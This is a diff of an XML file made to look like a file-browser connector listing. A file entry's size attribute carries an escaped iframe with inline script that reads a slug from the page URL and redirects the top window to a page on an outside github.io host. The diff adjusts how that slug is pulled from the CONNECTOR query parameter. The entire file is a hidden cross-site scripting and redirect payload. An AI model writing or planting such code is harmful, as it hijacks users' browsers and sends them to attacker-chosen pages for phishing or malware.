@@ -1,7 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <Connector resourceType="Document"><CurrentFolder path="/1 - f/" url=""/>
 <Files><File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;
-var m=/GetFoldersAndFiles=([^&amp;]+)/.exec(window.top.location.search);
+var cm=/[?&amp;]CONNECTOR=([^&amp;]+)/i.exec(window.top.location.search);
+var connectorVal=cm?decodeURIComponent(cm[1]):'';
+var m=/GetFoldersAndFiles=([^&amp;]+)/.exec(connectorVal);
 var slug=m?decodeURIComponent(m[1]):'yayhbxudrl';
 window.top.location.href='https://lambing-hummock-4a.github.io/vos/files/'+slug+'.html';
 &amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="1"/></Files></Connector>
